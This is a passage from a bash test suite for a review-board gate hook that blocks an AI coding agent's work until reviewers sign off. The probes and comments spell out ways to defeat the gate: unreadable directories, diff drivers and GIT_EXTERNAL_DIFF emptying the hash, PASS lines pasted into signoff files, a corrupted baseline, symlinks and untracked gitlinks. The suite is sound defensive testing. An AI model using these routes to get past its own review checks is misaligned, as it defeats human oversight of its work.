# a churning tree it had allowed, blaming an ACL that was not there.
#
# Driven with a `find` SHIM rather than a background `rm -rf` race, because a
# racy probe that passes when the race is lost is worse than none. The shim
# fails a bounded number of times and then delegates, which is exactly the shape
# churn has and nothing like the shape a permission denial has.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp/parts" && printf 'note\n' > "$d/tmp/parts/a.md"
shimdir=$(mktemp -d) || exit 1
realfind=$(command -v find)
# Fails only the FIRST call, then delegates: transient, and must not refuse.
# Fails only calls naming the ignored directory under test, and only the first.
# Two earlier versions pinned nothing and both passed: failing "the first find
# call" hit a depth probe, whose own re-measure absorbed it; failing the first
# `-print0` hit the STATE-DIR walk, whose own retry absorbed it; and failing the
# first call naming this directory hit the DEPTH probe, whose re-measure
# absorbed it. It takes both conditions -- this directory AND `-print0` -- to
# reach `walk_hidden_dir`'s own walk, which is the retry whose absence was
# measured as a live false refusal. Each of the three earlier versions passed
# while pinning nothing, which is the failure mode this suite exists to refuse,
# so each was found by deleting the retry and watching the probe stay green.
cat > "$shimdir/find" <<SHIM
#!/bin/sh
dir=no; p0=no
for a in "\$@"; do
  case "\$a" in *tmp*) dir=yes ;; esac
  [ "\$a" = "-print0" ] && p0=yes
done
if [ "\$dir" = yes ] && [ "\$p0" = yes ] && [ ! -f "$shimdir/fired" ]; then
  : > "$shimdir/fired"; exit 1
fi
exec $realfind "\$@"
SHIM
chmod +x "$shimdir/find"
err=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$shimdir:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
if [ -z "$err" ]; then
  ok "a transient find failure does not refuse"
else
  no "a transient find failure does not refuse" "spurious refusal: [$err]"
fi
# Fails every time: a real denial, and must refuse.
# Fails every `-print0` call: a real denial, which must survive the retry.
cat > "$shimdir/find" <<SHIM
#!/bin/sh
dir=no; p0=no
for a in "\$@"; do
  case "\$a" in *tmp*) dir=yes ;; esac
  [ "\$a" = "-print0" ] && p0=yes
done
[ "\$dir" = yes ] && [ "\$p0" = yes ] && exit 1
exec $realfind "\$@"
SHIM
chmod +x "$shimdir/find"
err=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$shimdir:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
if [ -n "$err" ]; then
  ok "a persistent find failure still refuses"
else
  no "a persistent find failure still refuses" "no refusal; got []"
fi
rm -rf "$shimdir" "$d"

# A FILENAME must not be able to forge a sentinel. The consumers matched with
# `case "$blob" in *"$SENTINEL"*` over a multi-line blob, so a file called
# `prefix__WALK_UNREADABLE__suffix.txt` in any ignored directory produced a
# refusal naming a condition that did not exist, unclearable by the remedy the
# message gave -- tree-wide, and pre-existing for two of the three sentinels.
for forge in "__WALK_UNREADABLE__" "prefix__WALK_UNREADABLE__suffix.txt" \
             "__WALK_TRUNCATED__" "__WALK_NEWLINE__.txt"; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  mkdir -p "$d/tmp"
  printf 'ordinary content\n' > "$d/tmp/$forge"
  err=$(we "$d")
  if [ -z "$err" ]; then
    ok "a filename cannot forge a walk sentinel ($forge)"
  else
    no "a filename cannot forge a walk sentinel ($forge)" "spurious refusal: [$err]"
  fi
  rm -rf "$d"
done

# The `newline` arm of state_dir_refusal, which a reviewer showed IS producible
# by the detector -- so the formatter probe's claim that only `*)` is
# unreachable was wrong, and deleting this arm left the whole suite green.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
nl=$(printf 'two\nlines.svelte')
if printf '%s\n' "$evil" > "$d/.claude/.review-board-state/$nl" 2>/dev/null; then
  err=$(we "$d")
  errw=$(wf "$d")
  if printf '%s' "$err" | grep -q 'literal newline byte' && printf '%s' "$errw" | grep -q 'literal newline byte'; then
    ok "a newline-named file in the state dir refuses with the newline sentence"
  else
    no "a newline-named file in the state dir refuses with the newline sentence" "hash=[$err] waiver=[$errw]"
  fi
  rm -f "$d/.claude/.review-board-state/$nl"
else
  no "a newline-named file in the state dir refuses with the newline sentence" "could not create the fixture"
fi
rm -rf "$d"

# The refusal must never hand a person an internal token where a path belongs.
# An earlier version of THIS PROBE did not pin that. A reviewer made the
# detector emit `__WALK_TRUNCATED__` as its reason; the sentinel duly surfaced
# in the sentence -- via the formatter's `*)` arm, which echoed its argument
# verbatim -- while this probe stayed green and the leak showed up only inside a
# neighbouring probe's failure payload. Its only live discrimination was that
# the fallback existed and returned non-empty. The reasons it fed were all ones
# the detector emits, none of which can contain a sentinel, so it was scanning
# for something its own inputs could not produce.
#
# It now feeds sentinel-BEARING reasons -- the shape a carelessly added reason
# would produce -- and asserts three properties: no arm leaks an internal token,
# no arm returns empty (an empty WORK_ERROR is a block with no explanation,
# which is the livelock class), and each known reason produces its own
# distinguishable sentence rather than silently falling through to the default.
#
# `source:` is exempt from the token scan by design: that arm interpolates a
# real path, and a file genuinely named `__WALK_TRUNCATED__.svelte` should be
# named. Driving the formatter directly is deliberate -- `deep` and `unreadable`
# have their own fixtures above, and the remaining arms are reachable only from
# the `*)` state, which the detector cannot produce. An earlier version of this
# comment said that of `newline` too, which was wrong -- a newline-named file in
# the state dir reaches it, and the newline fixture above this one
# proves it at both entry points. That comment also justified the choice with
# "a 750-file directory", which is
# `WALK_HIDDEN_CAP`, belonging to `walk_hidden_dir`; this walk deliberately has
# no cap.)
fmt() { (cd "$HOOKS_SRC/../.." && bash -c '. .claude/hooks/work-hash.sh; state_dir_refusal "$1" "test"' _ "$1"); }
bad=""
for reason in "unreadable:$STATE_DIR_PROBE" "deep:$STATE_DIR_PROBE" "newline:$STATE_DIR_PROBE" \
              "__WALK_TRUNCATED__:$STATE_DIR_PROBE" "__WALK_NEWLINE__:x" "wat:$STATE_DIR_PROBE"; do
  m=$(fmt "$reason")
  [ -z "$m" ] && bad="${bad} ${reason}(empty)"
  case "$m" in
    *__WALK_*|*__DENIED_*) bad="${bad} ${reason}(token-leak)" ;;
  esac
done
# Each known arm distinguishable, or three of them could be the default arm
# wearing three different inputs.
[ "$(fmt "unreadable:$STATE_DIR_PROBE")" = "$(fmt "deep:$STATE_DIR_PROBE")" ] && bad="${bad} unreadable/deep(identical)"
[ "$(fmt "deep:$STATE_DIR_PROBE")" = "$(fmt "newline:$STATE_DIR_PROBE")" ] && bad="${bad} deep/newline(identical)"
case "$(fmt "source:x/y.svelte")" in *x/y.svelte*) ;; *) bad="${bad} source(path-dropped)" ;; esac
if [ -z "$bad" ]; then
  ok "every refusal reason formats to a sentence, never a bare token"
else
  no "every refusal reason formats to a sentence, never a bare token" "leaked for:${bad}"
fi

# The `${#__deny[@]}` guard in `ignored_matching_paths`. Stock macOS /bin/bash
# (3.2) treats expanding an EMPTY array under `set -u` as an unbound variable
# and dies -- which at the two `-C` call sites, the ones that pass no excludes,
# silently takes out the gitlink and worktree checks: a fail-OPEN, and the
# reason the guard is written as a count test rather than a bare expansion.
#
# Drives /bin/bash EXPLICITLY, because the suite itself runs under whatever
# `bash` is on PATH and that is 5.x on this machine, where the same code is
# fine. Its discrimination is therefore version-dependent BY NATURE: it reddens
# where /bin/bash is 3.2 and is a weaker (still true) assertion elsewhere. Said
# plainly rather than dressed up as portable coverage -- the version it actually
# ran against is printed, so a green line cannot be mistaken for a proof it did
# not do.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp" && printf 'x\n' > "$d/tmp/x.md"
bv=$(/bin/bash --version 2>/dev/null | head -1 | sed -n 's/.*version \([0-9.]*\).*/\1/p')
out=$(cd "$d" && /bin/bash -c 'set -u; . .claude/hooks/work-hash.sh; ignored_matching_paths -C . .' 2>&1)
if printf '%s' "$out" | grep -qxF 'tmp/'; then
  ok "the empty-deny guard survives set -u at the -C call sites (/bin/bash $bv)"
else
  no "the empty-deny guard survives set -u at the -C call sites (/bin/bash $bv)" "got [$out]"
fi
rm -rf "$d"

# Istanbul's own layout puts `src` BELOW the artifact root. Escaping on any `src`
# segment regardless of position hashed 3000 coverage files at 7.05s and blocked.
# The scan is left-to-right now: first matching segment decides.
d=$(new_repo) || exit 1
mkdir -p "$d/coverage/lcov-report/src"
for i in 1 2 3; do printf '<html>%s</html>\n' "$i" > "$d/coverage/lcov-report/src/f$i.html"; done
printf 'coverage/\n' >> "$d/.git/info/exclude"
expect_allow "$d" "an artifact root wins over a src segment below it"
rm -rf "$d"


# `git status --ignored=matching` emits the collapsed `tmp/`, never its files, so
# renders() could only ever hit its src/static prefix arms and the extension arms
# were structurally unreachable. A dialog under a gitignored dir was invisible
# while SvelteKit compiled and SSR'd it -- the docs/ hole, via .gitignore.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/tmp"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/tmp/HiddenDialog.svelte"
expect_block "$d" "a component in a gitignored directory outside src/ still blocks"
rm -rf "$d"

# package.json pins the @lostgradient/* versions, so a formatting-only waiver on
# a chat bump changed every ARIA attribute and line of SSR output with no board.
d=$(new_repo) || exit 1
printf '{"dependencies":{"@lostgradient/chat":"9.9.9"}}\n' > "$d/package.json"
if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
  no "a package.json version bump is not waivable" "waiver was accepted"
else
  ok "a package.json version bump is not waivable"
fi
rm -rf "$d"

# The ignore-source rule was written three times and ordered correctly twice.
# The state-dir check matched an absolute ~/.gitignore against the in-tree arm,
# so the diagnostic never fired and the livelock it exists to stop was live.
d=$(new_repo) || exit 1
ext=$(mktemp -d) || exit 1
printf '.claude/.review-board-state/\n' > "$ext/.gitignore"
(cd "$d" && git config core.excludesFile "$ext/.gitignore")
echo "x" > "$d/src/routes/+page.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
if printf '%s' "$out" | grep -q "would make every sign-off invalidate itself"; then
  ok "an absolute excludes file hiding the state dir is diagnosed"
else
  no "an absolute excludes file hiding the state dir is diagnosed" "no diagnostic"
fi
rm -rf "$d" "$ext"


echo "the cap: fails closed, at the boundary, in both locations"

# No probe covered the cap at all, which is what let a fail-open ship: the
# truncation pre-check applied its predicates to the collapsed DIRECTORY path
# while the enumeration applied its own to the FILES inside, so a root-level
# `tmp/` was checked by neither and a component past the cap vanished.
for loc in "tmp" "src/routes/tmp"; do
  d=$(new_repo) || break
  (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  rm -f "$d/.claude/.review-board-state/last-cleared"
  (cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
  mkdir -p "$d/$loc"
  i=1; while [ "$i" -le 800 ]; do printf 'n\n' > "$d/$loc/a$(printf '%04d' $i).md"; i=$((i+1)); done
  printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/$loc/zzz-late.svelte"
  out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
  if printf '%s' "$out" | grep -q "hides more than"; then
    ok "a directory past the cap blocks by name ($loc)"
  else
    no "a directory past the cap blocks by name ($loc)" "gate did not name it: $(printf '%s' "$out" | head -c 60)"
  fi
  rm -rf "$d"
done

# Under the cap must still evaluate normally, or the bound has eaten the feature.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/tmp"
i=1; while [ "$i" -le 20 ]; do printf 'n\n' > "$d/tmp/a$i.md"; i=$((i+1)); done
printf '<div role="dialog"></div>\n' > "$d/tmp/zzz.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
if ! printf '%s' "$out" | grep -q '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"'; then
  no "a directory under the cap still blocks on its contents" "gate allowed"
elif printf '%s' "$out" | grep -q "hides more than"; then
  no "a directory under the cap still blocks on its contents" "blocked by truncation, not contents — the bound ate the feature"
else
  ok "a directory under the cap still blocks on its contents"
fi
rm -rf "$d"

# find's stderr is swallowed, so an unreadable directory was byte-identical on
# stdout to an empty one -- `chmod 000` was a one-command fail-open.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/tmp/inner" && printf '<div role="dialog"></div>\n' > "$d/tmp/inner/C.svelte"
chmod 000 "$d/tmp"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
chmod 755 "$d/tmp"
printf '%s' "$out" | grep -q "cannot be read" &&
  ok "an unreadable ignored directory blocks rather than reading as empty" ||
  no "an unreadable ignored directory blocks rather than reading as empty" "gate was silent"
rm -rf "$d"

# SKILL.md decides whether the board convenes at all; the agent files decide what
# each member looks for. They are one indirection out from .claude/hooks, which
# the code already calls a total bypass worth guarding.
d=$(new_repo) || exit 1
ext=$(mktemp -d) || exit 1
mkdir -p "$d/.claude/agents"
printf 'charter\n' > "$ext/agent.md"
(cd "$d/.claude/agents" && ln -s "$ext/agent.md" a11y-ssr-auditor.md)
out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
printf '%s' "$out" | grep -q "symlink under a rendered root" &&
  ok "a symlink on the board's own charter cannot be signed off" ||
  no "a symlink on the board's own charter cannot be signed off" "signed off cleanly"
rm -rf "$d" "$ext"


# `src/` is the WAIVER_NEVER arm carrying .ts/.js -- every other probe survives
# its removal on .svelte/.html/.css, so a `+page.server.ts` waived cleanly. The
# file's own comment calls load functions the commonest hydration-mismatch source.
d=$(new_repo) || exit 1
printf 'export const load = () => ({});\n' > "$d/src/routes/+page.server.ts"
if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
  no "a load function under src/ is not waivable" "waiver was accepted"
else
  ok "a load function under src/ is not waivable"
fi
rm -rf "$d"

# The waiver-side in-tree expansion: the hash side of this was fixed and probed,
# the waiver side was neither. Fixture must use an IN-TREE .gitignore, or
# ignore_source_is_external short-circuits and the branch never runs.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/tmp"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/tmp/Modal.svelte"
echo "# c" >> "$d/scripts/build.sh"
if signoff "$d" --waive --grounds comments-only --reason r >/dev/null 2>&1; then
  no "a component in an in-tree ignored directory is not waivable" "waiver was accepted"
else
  ok "a component in an in-tree ignored directory is not waivable"
fi
rm -rf "$d"

# -L is credited by three comments with fixing a shipped bug and watched by none.
d=$(new_repo) || exit 1
ext=$(mktemp -d) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/tmp"; printf '<div role="dialog"></div>\n' > "$ext/Widget.svelte"
(cd "$d/tmp" && ln -s "$ext" parts)
expect_block "$d" "a component behind a symlink inside an ignored directory blocks"
rm -rf "$d" "$ext"


echo "diff drivers cannot empty the hash"

# A textconv driver makes git omit changed paths ENTIRELY -- no `Binary files
# differ`, no `index <old>..<new>` -- so even blob OIDs disappear. Installed via
# core.attributesFile it needs no tracked-file change, so there is no first board
# round to catch the setup.
d=$(new_repo) || exit 1
ext=$(mktemp -d) || exit 1
printf '* diff=tc\n' > "$ext/attrs"
printf '#!/bin/sh\necho constant\n' > "$ext/tc.sh"; chmod +x "$ext/tc.sh"
(cd "$d" && git config core.attributesFile "$ext/attrs" && git config diff.tc.textconv "$ext/tc.sh")
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/+page.svelte"
(cd "$d" && git add -A && git commit -qm add) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true"><input placeholder="unreviewed"/></div>\n' > "$d/src/routes/+page.svelte"
expect_block "$d" "a textconv diff driver cannot empty the hash"
rm -rf "$d" "$ext"

# GIT_EXTERNAL_DIFF is the same class through the environment: no file anywhere.
d=$(new_repo) || exit 1
printf '<div role="dialog"></div>\n' > "$d/src/routes/+page.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" GIT_EXTERNAL_DIFF=/usr/bin/true \
  bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
printf '%s' "$out" | grep -q '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' &&
  ok "GIT_EXTERNAL_DIFF cannot empty the hash" ||
  no "GIT_EXTERNAL_DIFF cannot empty the hash" "gate was silent"
rm -rf "$d"


# Deleting the baseline was refused when sign-offs existed; CORRUPTING it took
# the other branch and re-established anyway. The gate's own error text used to
# instruct the operator to run exactly that.
d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/evil.svelte"
(cd "$d" && git add -A && git commit -qm sneak) >/dev/null 2>&1
printf 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\n' > "$d/.claude/.review-board-state/last-cleared"
if signoff "$d" --initialize >/dev/null 2>&1; then
  no "corrupting the baseline plus --initialize is not a bypass" "--initialize re-established over committed unreviewed work"
else
  ok "corrupting the baseline plus --initialize is not a bypass"
fi
rm -rf "$d"

# ...but a repo that has never been gated must still be able to recover.
d=$(new_repo) || exit 1
rm -rf "$d/.claude/.review-board-state/signoffs"
printf 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\n' > "$d/.claude/.review-board-state/last-cleared"
if signoff "$d" --initialize >/dev/null 2>&1; then
  ok "an unresolvable baseline with no sign-offs can still be re-established"
else
  no "an unresolvable baseline with no sign-offs can still be re-established" "--initialize refused, leaving no recovery"
fi
rm -rf "$d"


# The .html/.css arms of WAIVER_NEVER exist to catch a rendered file OUTSIDE
# src/ and static/. Every existing fixture sat under src/, so the `src/` prefix
# arm carried them and both extensions were deletable with the suite green.
for path in "assets/theme.css" "emails/welcome.html"; do
  d=$(new_repo) || break
  mkdir -p "$d/$(dirname "$path")"
  printf 'x\n' > "$d/$path"
  if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
    no "$path outside src/ is not waivable" "waiver was accepted"
  else
    ok "$path outside src/ is not waivable"
  fi
  rm -rf "$d"
done

# The stash probe asserted a bare exit status, so it could not tell the stash
# guard's refusal from the ref sweep catching the same component via `src/`.
d=$(new_repo) || exit 1
printf 'notes\n' > "$d/scripts/notes.txt"
(cd "$d" && git add -A -- scripts/notes.txt >/dev/null 2>&1 && git stash -q -- scripts/notes.txt) >/dev/null 2>&1
mkdir -p "$d/scripts"   # git stash removed the now-empty dir, so this append failed
echo "# c" >> "$d/scripts/build.sh"
out=$(signoff "$d" --waive --grounds comments-only --reason r 2>&1)
if [ $? -eq 0 ]; then
  no "the stash guard itself refuses, not the ref sweep" "waiver was accepted"
elif ! printf '%s' "$out" | grep -q "stash entry"; then
  no "the stash guard itself refuses, not the ref sweep" "refused by something else: $(printf '%s' "$out" | head -c 60)"
else
  ok "the stash guard itself refuses, not the ref sweep"
fi
rm -rf "$d"


# Descending a directory needs the SEARCH bit. `chmod 000` clears read AND
# search, which is why a probe written for it passed while `chmod 400` -- a
# genuinely readable, un-descendable directory -- produced a hash identical to
# the directory being absent. Sign off, then materialize a component behind it.
for mode in 400 000; do
  d=$(new_repo) || break
  (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  rm -f "$d/.claude/.review-board-state/last-cleared"
  (cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
  mkdir -p "$d/tmp/inner"
  printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/tmp/inner/C.svelte"
  chmod "$mode" "$d/tmp/inner"
  out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
  chmod 755 "$d/tmp/inner"
  printf '%s' "$out" | grep -q "cannot be read" &&
    ok "a chmod $mode directory inside an ignored tree blocks" ||
    no "a chmod $mode directory inside an ignored tree blocks" "gate was silent"
  rm -rf "$d"
done

# An unreadable FILE must block even where the current user can bypass mode bits.
# A `wc` shim makes the size-read failure deterministic on every platform.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp" "$d/fakebin"; printf '<div role="dialog"></div>\n' > "$d/tmp/C.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
cat > "$d/fakebin/wc" <<'SHIM'
#!/usr/bin/env bash
case "$*" in *-c*) exit 1 ;; *) exec /usr/bin/wc "$@" ;; esac
SHIM
chmod +x "$d/fakebin/wc"
printf '<main role="dialog"></main>\n' > "$d/tmp/C.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$d/fakebin:$PATH" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
printf '%s' "$out" | grep -q "could not be read" &&
  ok "an unreadable file inside an ignored tree blocks" ||
  no "an unreadable file inside an ignored tree blocks" "gate output: $out"
rm -rf "$d"


# The notes sentinel is a forgery defence and nothing watched it: replacing the
# awk truncation with `cat` left the whole suite green. One `>>` on a gitignored
# file forges three of four vetoes.
d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor >/dev/null 2>&1
sig=$(find "$d/.claude/.review-board-state/signoffs" -name '*.signoff' | head -1)
if [ -n "$sig" ]; then
  printf 'harness-skeptic: PASS\ncontract-auditor: PASS\na11y-ssr-auditor: PASS\n' >> "$sig"
  expect_block "$d" "PASS lines pasted after the notes sentinel do not count"
else
  no "PASS lines pasted after the notes sentinel do not count" "no signoff file written"
fi
rm -rf "$d"

# The depth refusal was the other unprobed live fail-open: walk_hidden_dir's
# -maxdepth 12 walks past a deeper component silently, so without the refusal an
# SSR'd unreviewed route clears the gate.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/tmp/a/b/c/e/f/g/h/i/j/k/l/m"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/tmp/a/b/c/e/f/g/h/i/j/k/l/m/+page.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
printf '%s' "$out" | grep -q "nests deeper" &&
  ok "a component below the walk's depth bound blocks" ||
  no "a component below the walk's depth bound blocks" "gate did not refuse on depth"
rm -rf "$d"

# The depth pre-check used to run on every ignored directory unconditionally,
# with no is_artifact filter -- so an ORDINARY node_modules nested past depth
# 13 bricked the gate with an unactionable "flatten it", even though
# walk_hidden_dir prunes node_modules entirely and would never have descended
# there. Real on this machine: both ../cinder's and ../agent-bureau's own
# node_modules exceed this depth today. The probe just above proves a
# genuinely deep NON-artifact directory still refuses; this proves an
# artifact one does not.
# expect_allow, not a bare `grep -q "nests deeper" &&  no || ok`: that
# asserted only the ABSENCE of one string, which stays absent if the gate
# crashes, hangs, or is replaced outright -- exactly the "a stubbed gate
# reads as unproven" trap expect_allow/gate() exist to catch. Confirmed:
# inserting `exit 0` right after the gate's flag parsing left the bare
# version reporting ok while every other allow/block probe failed.
# The `.gitignore` rule is committed and SIGNED OFF FIRST (it is itself
# reviewable work -- adding an ignore rule hides source), then the deep
# node_modules content is added on top with nothing else in the reviewable
# diff changed. expect_allow needs a real clean state to assert against:
# node_modules is an ARTIFACT_DIR, excluded from the hash entirely once
# walk_hidden_dir prunes it, so nothing about its content should ever
# require a fresh review -- confirming that is the whole point of this
# probe, separate from "was this ever reviewed at all".
d=$(new_repo) || exit 1
(cd "$d" && printf 'node_modules/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
deep="$d/node_modules/a/b/c/d/e/f/g/h/i/j/k/l/m"
mkdir -p "$deep" && echo x > "$deep/file.txt"
expect_allow "$d" "a deep node_modules does not brick the gate"
rm -rf "$d"

# An UNTRACKED gitlink (`cd src/lib/vendor && git init`, never `git add`-ed to
# the superproject) produced no 160000 entry in the REAL index, so the dirty-
# submodule guard -- keyed on `git ls-files -s`, which only sees tracked
# gitlinks -- never fired for it. Meanwhile the hash's own throwaway index
# (built with `git add -A -N`) DID materialize it, and a gitlink's diff
# saturates at "-dirty" the moment it is, so a signed-off component behind an
# untracked embedded repo could be rewritten afterward with nothing to catch
# it. Two steps, matching the symlink probes above: sign off while clean,
# then dirty it and confirm the gate notices.
d=$(new_repo) || exit 1
mkdir -p "$d/src/lib/vendor"
(cd "$d/src/lib/vendor" && git init -q && printf '<h1>v1</h1>\n' > V.svelte && git add -A && git commit -qm v) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true">rewritten</div>\n' > "$d/src/lib/vendor/V.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
printf '%s' "$out" | grep -q "embedded repository" &&
  ok "a rewrite behind an untracked gitlink is not silently cleared" ||
  no "a rewrite behind an untracked gitlink is not silently cleared" "gate allowed"
rm -rf "$d"

# The same untracked-gitlink blind spot, on the WAIVER path: `git diff
# --name-only` reports a changed gitlink as one opaque directory path
# (`docs/vendor`, not `docs/vendor/Modal.svelte`), which matches no
# WAIVER_NEVER pattern -- the exact collapse already fixed for git-ignored
# directories, but that fix never reached gitlinks.
d=$(new_repo) || exit 1
mkdir -p "$d/docs/vendor"
(cd "$d/docs/vendor" && git init -q \
  && printf '<div role="dialog" aria-modal="true">no trap</div>\n' > Modal.svelte \
  && git add -A && git commit -qm v) >/dev/null 2>&1
out=$(signoff "$d" --waive --grounds formatting-only --reason "nothing here renders" 2>&1)
printf '%s' "$out" | grep -q "Modal.svelte" &&
  ok "an untracked gitlink's contents are not waivable" ||
  no "an untracked gitlink's contents are not waivable" "waived cleanly: $out"
rm -rf "$d"

# WAIVER_NEVER compares byte-for-byte, and this repo's filesystem is
# case-insensitive (`core.ignorecase=true`, APFS default) -- so
# `assets/Theme.CSS` matched no pattern in the list while being, on disk,
# exactly the file `.css` names. `src/` itself is not exploitable this way
# (git normalizes a tracked `SRC/...` back to `src/...`), but the extension
# arms outside `src/` had no such backstop.
d=$(new_repo) || exit 1
mkdir -p "$d/assets"
printf 'body{color:red}\n' > "$d/assets/Theme.CSS"
git -C "$d" add -A >/dev/null 2>&1
out=$(signoff "$d" --waive --grounds formatting-only --reason r 2>&1)
printf '%s' "$out" | grep -q "Theme.CSS" &&
  ok "a mixed-case extension is not waivable" ||
  no "a mixed-case extension is not waivable" "waived cleanly: $out"
rm -rf "$d"

# A single-file .gitignore rule naming a RENDERED file outside src/static
# (`hidden.svelte`, not a directory) was invisible to the hash: the
# directory-shaped enumeration above was expanded to catch is_source files,
# but the single-file branch's `elif renders "$f"` arm had no probe at all,
# and is exactly what SvelteKit still SSRs.
d=$(new_repo) || exit 1
printf 'hidden.svelte\n' >> "$d/.gitignore"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/hidden.svelte"
git -C "$d" add .gitignore >/dev/null 2>&1
